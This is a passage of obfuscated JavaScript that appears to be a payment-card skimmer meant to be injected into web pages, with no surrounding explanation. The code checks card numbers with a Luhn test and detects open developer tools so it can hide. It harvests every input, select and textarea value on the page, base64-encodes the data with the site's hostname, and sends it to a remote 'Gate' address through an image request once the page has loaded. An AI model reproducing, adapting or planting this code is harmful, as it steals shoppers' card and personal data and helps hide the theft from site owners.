_0x4cbeaa=_0x1aa773[_0x55f3('0x3')](_0xfce9b),_0x59d6a7=parseInt(_0x4cbeaa,0xa);if(_0x41e20b){if((_0x59d6a7*=0x2)>0x9)_0x59d6a7-=0x9;}_0x311ae9+=_0x59d6a7;_0x41e20b=!_0x41e20b;}return _0x311ae9%0xa==0x0;}(function(){'use strict';const _0x2a1fb6={};_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;const _0x4a22d0=0xa0;const _0x1924e7=(_0x4d1adc,_0x30711a)=>{window[_0x55f3('0x5')](new CustomEvent(_0x55f3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4d1adc,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x30711a}}));};setInterval(()=>{const _0x4ca01b=window[_0x55f3('0x7')]-window[_0x55f3('0x8')]>_0x4a22d0;const _0x21191d=window[_0x55f3('0x9')]-window[_0x55f3('0xa')]>_0x4a22d0;const _0x34fe75=_0x4ca01b?_0x55f3('0xb'):_0x55f3('0xc');if(!(_0x21191d&&_0x4ca01b)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x55f3('0xd')][_0x55f3('0xe')]&&window[_0x55f3('0xd')][_0x55f3('0xe')][_0x55f3('0xf')]||_0x4ca01b||_0x21191d)){if(!_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']||_0x2a1fb6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x34fe75){_0x1924e7(!![],_0x34fe75);}_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=!![];_0x2a1fb6[_0x55f3('0x4')]=_0x34fe75;}else{if(_0x2a1fb6[_0x55f3('0x10')]){_0x1924e7(![],undefined);}_0x2a1fb6[_0x55f3('0x10')]=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x55f3('0x11')&&module[_0x55f3('0x12')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x2a1fb6;}else{window[_0x55f3('0x13')]=_0x2a1fb6;}}());String[_0x55f3('0x14')][_0x55f3('0x15')]=function(){var _0x14c331=0x0,_0x3038b7,_0x1df079;if(this[_0x55f3('0x2')]===0x0)return _0x14c331;for(_0x3038b7=0x0;_0x3038b7<this['\x6c\x65\x6e\x67\x74\x68'];_0x3038b7++){_0x1df079=this[_0x55f3('0x16')](_0x3038b7);_0x14c331=(_0x14c331<<0x5)-_0x14c331+_0x1df079;_0x14c331|=0x0;}return _0x14c331;};var _0x1d4e17={};_0x1d4e17[_0x55f3('0x17')]=_0x55f3('0x18');_0x1d4e17[_0x55f3('0x19')]={};_0x1d4e17[_0x55f3('0x1a')]=[];_0x1d4e17[_0x55f3('0x1b')]=![];_0x1d4e17[_0x55f3('0x1c')]=function(_0x5a577a){if(_0x5a577a.id!==undefined&&_0x5a577a.id!=''&&_0x5a577a.id!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.id]=_0x5a577a.value;return;}if(_0x5a577a.name!==undefined&&_0x5a577a.name!=''&&_0x5a577a.name!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.name]=_0x5a577a.value;return;}};_0x1d4e17[_0x55f3('0x1d')]=function(){var _0x4b7d89=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x416e43=document.getElementsByTagName(_0x55f3('0x1e'));var _0xb9ea72=document.getElementsByTagName(_0x55f3('0x1f'));for(var _0x4e1506=0x0;_0x4e1506<_0x4b7d89.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x4b7d89[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0x416e43.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x416e43[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0xb9ea72.length;_0x4e1506++)_0x1d4e17.SaveParam(_0xb9ea72[_0x4e1506]);};_0x1d4e17[_0x55f3('0x20')]=function(){if(!window.devtools.isOpen&&_0x1d4e17.IsValid){_0x1d4e17.Data[_0x55f3('0x21')]=location.hostname;var _0x58f0b3=encodeURIComponent(window.btoa(JSON.stringify(_0x1d4e17.Data)));var _0x806a82=_0x58f0b3.hashCode();for(var _0x144a4e=0x0;_0x144a4e<_0x1d4e17.Sent.length;_0x144a4e++)if(_0x1d4e17.Sent[_0x144a4e]==_0x806a82)return;_0x1d4e17.LoadImage(_0x58f0b3);}};_0x1d4e17[_0x55f3('0x22')]=function(){_0x1d4e17.SaveAllFields();_0x1d4e17.SendData();};_0x1d4e17[_0x55f3('0x23')]=function(_0xa208f0){_0x1d4e17.Sent.push(_0xa208f0.hashCode());var _0x3547ee=document.createElement(_0x55f3('0x24'));_0x3547ee.src=_0x1d4e17.GetImageUrl(_0xa208f0);};_0x1d4e17[_0x55f3('0x25')]=function(_0x674c51){return _0x1d4e17.Gate+_0x55f3('0x26')+_0x674c51;};document[_0x55f3('0x27')]=function(){if(document[_0x55f3('0x28')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x55f3('0x29')](_0x1d4e17['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};